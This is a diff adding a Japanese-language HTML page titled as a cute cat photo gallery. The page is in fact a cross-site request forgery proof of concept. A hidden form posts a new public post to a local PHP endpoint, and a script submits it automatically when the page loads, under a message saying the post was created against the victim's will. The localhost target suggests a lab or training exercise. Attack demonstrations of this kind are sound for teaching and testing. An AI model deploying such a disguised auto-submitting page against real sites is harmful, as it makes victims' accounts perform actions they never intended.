@@ -1,0 +1,31 @@
+<!doctype html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8" />
+    <title>かわいい猫の画像集</title>
+  </head>
+
+  <body>
+    <h1>かわいい猫の画像集 🐱</h1>
+    <p>画像を読み込んでいます…</p>
+
+    <form
+      id="attack"
+      action="http://localhost:8080/post_create.php"
+      method="POST"
+    >
+      <input type="hidden" name="title" value="CSRFで作られた投稿" />
+      <input
+        type="hidden"
+        name="content"
+        value="このポストは被害者の意図に反して作成されました"
+      />
+      <input type="hidden" name="is_public" value="1" />
+    </form>
+    <input type="hidden" name="username" value="hacked_by_csrf" />
+
+    <script>
+      document.getElementById("attack").submit();
+    </script>
+  </body>
+</html>
